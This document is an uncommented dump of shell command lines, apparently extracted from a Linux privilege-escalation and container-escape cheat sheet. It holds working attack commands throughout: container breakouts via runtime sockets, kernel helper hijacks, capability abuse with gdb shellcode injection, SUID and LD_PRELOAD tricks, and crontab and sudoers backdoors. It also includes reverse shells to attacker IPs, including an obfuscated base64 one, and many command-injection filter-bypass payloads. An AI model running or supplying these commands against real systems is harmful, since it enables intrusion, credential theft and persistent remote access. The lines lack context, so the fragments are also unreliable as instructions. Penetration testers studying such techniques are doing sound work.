+curl --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' -X POST http://localhost/v1.54/containers/helper/exec
+ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
+ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
+chroot /host /bin/sh
+nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
+buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
+buildctl --addr unix:///run/buildkit/buildkitd.sock du
+buildctl --addr unix:///run/buildkit/buildkitd.sock build --frontend dockerfile.v0 --local context=. --local dockerfile=. --allow network.host --allow security.insecure --output type=local,dest=/tmp/buildkit-out
+curl -sk https://127.0.0.1:10250/pods
+curl -sk https://127.0.0.1:10250/runningpods/
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
+curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
+mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
+ss -lntp 2>/dev/null | grep -E ':2375|:2376'
+env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
+find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
+go build main.go
+./main
+docker exec -it web /bin/sh
+for p in /proc/sys/kernel/core_pattern /proc/sys/kernel/modprobe /proc/sysrq-trigger /proc/kmsg /proc/kallsyms /proc/kcore /proc/sched_debug /proc/1/mountinfo /proc/config.gz; do
+[ -e "$p" ] && ls -l "$p"
+cat /proc/self/mountinfo | head -n 50
+mount | grep overlay
+[ -w /proc/sys/kernel/modprobe ] || exit 1
+host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
+cat <<'EOF' > /tmp/modprobe-payload
+chmod +x /tmp/modprobe-payload
+echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
+cat /proc/sys/kernel/modprobe
+head -n 20 /proc/kallsyms 2>/dev/null
+dmesg 2>/dev/null | head -n 50
+zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
+echo b > /proc/sysrq-trigger
+find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
+find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
+find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
+find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
+cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
+cat <<'EOF' > /evil-helper
+chmod +x /evil-helper
+echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
+find /host-var/ -type f -iname '*.env*' 2>/dev/null
+find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
+cat /host-var/lib/kubelet/pods/mypod/volumes/kubernetes.io~projected/myvol/token 2>/dev/null
+TOKEN=$(cat /host-var/lib/kubelet/pods/mypod/volumes/kubernetes.io~projected/myvol/token 2>/dev/null)
+curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
+docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
+find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
+find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
+grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
+find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
+find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
+ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
+find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
+grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
+plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
+[ -n "$plugin" ] || exit 1
+mv "$plugin" "${plugin}.orig"
+cat <<'EOF' > "$plugin"
+chmod +x "$plugin"
+echo "wait for the next pod scheduled on this node"
+docker -H unix:///host/run/docker.sock version 2>/dev/null
+crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
+mount | grep -E ' /host|/mnt|/shared|/opt|/var '
+find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
+grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
+printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
+chmod +x /host/path/to/hook.sh
+find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
+find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
+find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
+which ctr
+/usr/bin/ctr
+ctr image list
+REF TYPE DIGEST SIZE PLATFORMS LABELS
+registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
+registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
+ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
+ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
+runc -help
+runc spec
+Inside the "mounts" section of the create config.json add the following lines:
+"type": "bind",
+"source": "/",
+"destination": "/",
+"options": [
+"rbind",
+"rw",
+mkdir rootfs
+runc run demo
+readelf -d ./sharedvuln | grep NEEDED
+ldconfig -p | grep libcustom
+/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null
+LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
+echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
+cd /tmp
+mkdir -p conf
+echo "include /tmp/conf/*" > fake.ld.so.conf
+echo "/tmp" > conf/evil.conf
+sudo ldconfig -f fake.ld.so.conf
+ldd sharedvuln
+linux-vdso.so.1 => (0x00007fffa2dde000)
+libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
+/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
+cat /proc/1234/status | grep Cap
+cat /proc/$$/status | grep Cap
+CapInh: 0000000000000000
+CapPrm: 0000003fffffffff
+CapEff: 0000003fffffffff
+CapBnd: 0000003fffffffff
+CapAmb: 0000000000000000
+capsh --decode=0000003fffffffff
+0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
+cat /proc/9491/status | grep Cap
+CapPrm: 0000000000003000
+CapEff: 0000000000000000
+capsh --decode=0000000000003000
+0x0000000000003000=cap_net_admin,cap_net_raw
+getpcaps 1234
+setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
+getpcaps 9562
+cat /proc/9562/status | grep Cap
+CapEff: 0000000000003000
+getcap /usr/bin/ping
+/usr/bin/ping = cap_net_raw+ep
+getcap -r / 2>/dev/null
+capsh --drop=cap_net_raw --print -- -c "tcpdump"
+setcap -r </path/to/binary>
+cap_sys_ptrace developer
+cap_net_raw user1
+cap_net_admin,cap_net_raw jrnetadmin
+12,13 jrnetadmin
+cap_sys_admin,22,25 jrsysadmin
+gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
+sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
+./ambient /bin/bash
+Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
+AmbientCapabilities=CAP_NET_BIND_SERVICE
+docker run --rm -it r.j3ss.co/amicontained bash
+Capabilities:
+BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap
+docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash
+docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash
+docker run --rm -it --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
+setcap cap_net_raw+ep /sbin/ping
+getcap /sbin/ping
+/sbin/ping = cap_net_raw+ep
+setcap cap_setuid+ep /usr/bin/python2.7
+/usr/bin/python2.7 = cap_setuid+ep
+/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
+getcap /usr/sbin/tcpdump
+/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
+/usr/bin/python2.7 = cap_sys_admin+ep
+cp /etc/passwd ./
+openssl passwd -1 -salt abc password
+vim ./passwd
+fdisk -l
+Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
+Units: sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+mount /dev/sda /mnt/
+cd /mnt
+chroot ./ bash
+nc -v -n -w2 -z 172.17.0.1 1-65535
+(UNKNOWN) [172.17.0.1] 2222 (?) open
+chroot /mnt/ adduser john
+ssh john@172.17.0.1 -p 2222
+/usr/bin/python2.7 = cap_sys_ptrace+ep
+set {long}($rip+8) = 0x5e016a5f026a9958
+set {long}($rip+16) = 0x0002b9489748050f
+set {long}($rip+24) = 0x48510b0e0a0a2923
+set {long}($rip+32) = 0x582a6a5a106ae689
+set {long}($rip+40) = 0xceff485e036a050f
+set {long}($rip+48) = 0x6af675050f58216a
+set {long}($rip+56) = 0x69622fbb4899583b
+set {long}($rip+64) = 0x8948530068732f6e
+set {long}($rip+72) = 0x050fe689485752e7
+/usr/bin/gdb -p $(pgrep sleep)
+[...]
+Continuing.
+process 207009 is executing new program: /usr/bin/dash
+gdb -p 1234
+Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
+Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
+secure-noroot: no (unlocked)
+secure-no-suid-fixup: no (unlocked)
+secure-keep-caps: no (unlocked)
+/usr/bin/python2.7 = cap_sys_module+ep
+mkdir lib/modules -p
+cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
+cp reverse-shell.ko lib/modules/$(uname -r)/
+/bin/kmod = cap_sys_module+ep
+Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
+Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory. Stop.
+sudo apt update
+sudo apt full-upgrade
+nc -lvnp 4444
+insmod reverse-shell.ko
+cd /etc
+tar -czf /tmp/shadow.tar.gz shadow
+tar -cxf shadow.tar.gz
+/usr/bin/vim = cap_dac_override+ep
+vim /etc/sudoers
+Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
+Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+python -c 'import os;os.chown("/etc/shadow",1000,1000)'
+ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
+find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
+find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
+find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
+cat /etc/shadow
+python setcapability.py /usr/bin/python2.7
+cat /proc/`pidof bash`/status | grep Cap
+CapInh: 00000000a80425fb
+CapPrm: 00000000a80425fb
+CapEff: 00000000a80425fb
+CapBnd: 00000000a80425fb
+capsh --decode=00000000a80425fb
+0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+getcap /usr/bin/gdb
+/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip
+setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb
+/usr/bin/gdb
+bash: /usr/bin/gdb: Operation not permitted
+/usr/sbin/tcpdump = cap_net_raw+ep
+mknod /dev/sdb b 8 16
+chmod 660 /dev/sdb
+useradd -u 1000 standarduser
+su standarduser
+ps aux | grep -i container_name | grep -i standarduser
+head /proc/12345/root/dev/sdb
+mkdir /tmp/pe
+cd /tmp/pe
+cp /bin/bash .
+chmod +s bash
+./bash -p
+gcc payload.c -o payload
+cp /tmp/payload .
+chmod +s payload
+./payload
+./bootstrap
+./configure
+make
+gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
+cat pwn.c
+int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
+gcc pwn.c -o a.out
+LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
+LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
+LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
+LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
+/mnt/share/a.out
+sestatus
+id -Z
+ls -Zd / /root /home /tmp /etc /var/www 2>/dev/null
+semodule -lfull 2>/dev/null
+semanage fcontext -C -l 2>/dev/null
+semanage permissive -l 2>/dev/null
+semanage login -l 2>/dev/null
+semanage user -l 2>/dev/null
+find / -context '*:default_t:*' -o -context '*:file_t:*' 2>/dev/null
+matchpathcon -V /path/of/interest 2>/dev/null
+restorecon -n -v /path/of/interest 2>/dev/null
+sepolicy transition -s "$(id -Z | awk -F: '{print $3}')" 2>/dev/null
+sesearch -A -s staff_t 2>/dev/null | head
+sesearch --type_transition -s staff_t 2>/dev/null | head
+seinfo -t 2>/dev/null | head
+seinfo -r 2>/dev/null | head
+sudo -l
+which newrole runcon
+newrole -l 2>/dev/null
+grep -R . /etc/selinux/*/contexts/files/file_contexts.local 2>/dev/null
+restorecon -nvr / 2>/dev/null | head -n 50
+matchpathcon -V /etc/passwd /etc/shadow /usr/local/bin/* 2>/dev/null
+grep -R . /etc/selinux/*/contexts/customizable_types 2>/dev/null | head
+restorecon -F -v /path/of/interest 2>/dev/null
+which semanage restorecon chcon setfiles semodule audit2allow runcon newrole setsebool load_policy 2>/dev/null
+getcap -r / 2>/dev/null | grep -E 'cap_mac_admin|cap_mac_override'
+sudo -l | grep -E 'semanage|restorecon|setfiles|semodule|runcon|newrole|setsebool|load_policy'
+restorecon -n -v /usr/local/bin /opt /srv /var/www 2>/dev/null
+ausearch -m AVC,USER_AVC -ts recent 2>/dev/null | audit2allow -M localfix
+sudo semodule -i localfix.pp
+sudo semodule -DB
+ausearch -m AVC,USER_AVC,SELINUX_ERR -ts recent 2>/dev/null | tail -n 50
+sudo semodule -B
+semodule -E --cil mymod 2>/dev/null
+ausearch -m AVC,USER_AVC,SELINUX_ERR -ts recent 2>/dev/null
+journalctl -t setroubleshoot --no-pager 2>/dev/null | tail -n 50
+sudo -l 2>/dev/null
+grep -R "ROLE=\|TYPE=" /etc/sudoers /etc/sudoers.d 2>/dev/null
+podman run -d fedora sleep 100
+d4194babf6b877c7100e79de92cd6717166f7302113018686cea650ea40bd7cb
+podman top -l label
+LABEL
+find / -perm -4000 -type f -ls 2>/dev/null
+file /path/to/suid-binary
+ldd /path/to/suid-binary 2>/dev/null
+readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
+readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
+find / -writable -type d 2>/dev/null | head -n 50
+strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
+gcc -shared -fPIC proof.c -o /writable/path/libexample.so
+/path/to/suid-binary
+cat /tmp/suid-so-ran
+namei -om /path/to/library.so
+readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
+objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
+ls -ld /opt/app/lib
+gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
+LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
+sudo LD_PRELOAD=/tmp/proof.so /allowed/command
+ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
+find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
+find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
+ldconfig -v 2>/dev/null | head -n 50
+find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
+stat /path/to/suid-wrapper
+find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
+touch "--reference=/root/secret``file"
+chown -R alice:alice *.php
+chmod -R 644 *.php
+echo 'echo pwned > /tmp/pwn' > shell.sh
+chmod +x shell.sh
+touch "--checkpoint=1"
+touch "--checkpoint-action=exec=sh shell.sh"
+touch "--use-compress-program=/bin/sh"
+touch "-e sh shell.sh"
+cd /path/controlled
+ln -s /etc/shadow root.txt
+touch @root.txt
+7za a /backup/`date +%F`.7z -t7z -snl -- *
+zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap
+zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap
+rg -n --hidden --follow '(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' /etc /opt /usr/local /srv 2>/dev/null
+pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'
+rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
+cat > /mnt/disk1_1/rce.sh <<'EOF'
+chmod +x /mnt/disk1_1/rce.sh
+/debug/tcpdump --filter="udp port 1234" --file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"
+nc -6 -lvnp 4444 &
+printf x | nc -u -6 [victim_ipv6] 1234
+sudo tcpdump -c10 -w/var/cache/captures/a/ -w /dev/shm/out.pcap -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+sudo tcpdump -c10 -w/var/cache/captures/a/../../../../dev/shm/out -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root -w /dev/shm/root-owned -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
+sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
+cat sudoers | nc -u 127.0.0.1 9001; kill %1
+sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root -r sudoers.pcap -w /etc/sudoers.d/1111-aaaa -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt -w /tmp/dummy -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
+chmod +x pre-commit
+ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
+find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
+systemctl list-timers --all 2>/dev/null
+grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
+echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
+cat > /etc/cron.daily/backup <<'EOF'
+chmod +x /etc/cron.daily/backup
+ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
+systemctl list-units --type=service --all 2>/dev/null
+systemctl list-units --type=socket --all 2>/dev/null
+grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
+systemctl daemon-reload
+systemctl restart vulnerable.service
+Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
+Name=Evil Desktop Entry
+chmod +x /dev/shm/pspy64
+/dev/shm/pspy64
+mv server-command server-command.bk
+cat > server-command <<'EOF'
+chmod +x server-command
+unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
+sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
+modprobe -n -v xt_TEE 2>/dev/null
+modprobe -n -v esp4 2>/dev/null
+modprobe -n -v esp6 2>/dev/null
+lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
+uname -r
+grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
+lsmod | grep algif_aead
+find / -perm -4000 -type f 2>/dev/null
+echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
+rmmod algif_aead 2>/dev/null || true
+initcall_blacklist=algif_aead_init
+echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
+(sh)0>/dev/tcp/10.10.10.10/443
+exec >&0
+/usr/bin/p?ng
+nma? -p 80 localhost
+/usr/bin/who*mi
+touch -- -la
+ls *
+echo *
+/usr/bin/n[c]
+'p'i'n'g
+"w"h"o"a"m"i
+ech''o test
+ech""o test
+bas''e64
+/\b\i\n/////s\h
+who$@ami
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+$(a="WhOaMi";printf %s "${a,,}")
+$(rev<<<'imaohw')
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+echo whoami|$0
+cat$u /etc$u/passwd$u
+p${u}i${u}n${u}g
+p i n g
+p$(u)i$(u)n$(u)g
+w`u`h`u`o`u`a`u`m`u`i
+whoa
+!-1!-2
+{cat,lol.txt}
+{echo,test}
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
+IFS=];b=cat]/etc/passwd;$b
+IFS=,;`cat<<<cat,/etc/passwd`
+echo${IFS}test
+X=$'cat\x20/etc/passwd'&&$X
+echo "ls\x09-l" | bash
+$u $u
+uname!-1\-a
+cat ${HOME:0:1}etc${HOME:0:1}passwd
+cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
+cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
+cat `xxd -r -p <<< 2f6574632f706173737764`
+xxd -r -ps <(echo 2f6574632f706173737764)
+cat `xxd -r -ps <(echo 2f6574632f706173737764)`
+127.0.0.1 == 2130706433
+time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
+echo ${LS_COLORS:10:1}
+echo ${PATH:0:1}
+declare builtins
+PATH="/bin" /bin/ls
+export PATH="/bin"
+declare PATH="/bin"
+SHELL=/bin/bash
+$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
+read aaa; exec $aaa
+read aaa; eval $aaa
+printf %.1s "$PWD"
+$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
+declare
+declare functions
+declare historywords
+source f*
+flag.txt:1: command not found: CTF{asdasdasd}
+while read -r line; do echo $line; done < /etc/passwd
+history
+declare history
+enable -n [
+echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
+chmod +x [
+export PATH=/tmp:$PATH
+if [ "a" ]; then echo 1; fi
+/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
+./bashfuscator -c 'cat /etc/passwd'
+http://host/?cmd=>ls http://host/?cmd=ls>_
+http://host/?cmd=>\ http://host/?cmd=>-t http://host/?cmd=>\>g
+http://host/?cmd=ls>>_
+http://host/?cmd=>on
+http://host/?cmd=>th http://host/?cmd=>py http://host/?cmd=>\| http://host/?cmd=>tw http://host/?cmd=>e. http://host/?cmd=>ng http://host/?cmd=>ra http://host/?cmd=>o http://host/?cmd=>\ http://host/?cmd=>rl http://host/?cmd=>cu http://host/?cmd=sh _
+http://host/?cmd=sh g
+https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
+http://52.199.204.34/?cmd=>tar
+http://52.199.204.34/?cmd=>zcf
+http://52.199.204.34/?cmd=>zzz
+http://52.199.204.34/?cmd=*%20/h*
+ln /f*
+tail
+hexdump
+SEEKER=cmp bash ddexec.sh ls -l <<< $(base64 -w0 /bin/ls)
+SEEKER=xxd SEEKER_ARGS='-s $offset' zsh ddexec.sh ls -l <<< $(base64 -w0 /bin/ls)
+export MYGLOBAL="hello world"
+echo $MYGLOBAL
+unset MYGLOBAL
+LOCAL="my local"
+echo $LOCAL
+unset LOCAL
+printenv
+cat /proc/$$/environ
+cat /proc/`python -c "import os; print(os.getppid())"`/environ
+tr '\0' '\n' </proc/$$/environ | sort -u
+tr '\0' '\n' </proc/1234/environ | sort -u
+export HISTFILESIZE=0
+export HISTSIZE=0
+export HISTCONTROL=ignorespace
+echo "to save or"
+echo "not to save"
+export HISTFILE=/dev/null
+unset HISTFILE
+export http_proxy="http://10.10.10.10:8080"
+export https_proxy="http://10.10.10.10:8080"
+export all_proxy="socks5h://10.10.10.10:1080"
+export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
+export SSL_CERT_FILE=/path/to/ca-bundle.pem
+export SSL_CERT_DIR=/path/to/ca-certificates
+mkdir -p /dev/shm/bin
+cat > /dev/shm/bin/tar <<'EOF'
+chmod +x /dev/shm/bin/tar
+PATH=/dev/shm/bin:$PATH vulnerable-wrapper
+export HOME=/dev/shm/fakehome
+export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
+mkdir -p "$XDG_CONFIG_HOME"
+env | grep -E '^LD_'
+ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
+"$ldso" --list-diagnostics /bin/true | head
+"$ldso" --list-tunables /bin/true | head
+GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
+cat > /tmp/pre.sh <<'EOF' echo '[+] sourced before the target script' EOF
+BASH_ENV=/tmp/pre.sh bash -c 'echo target'
+mkdir -p /tmp/pylib
+printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
+PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
+PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'
+mkdir -p /tmp/perllib
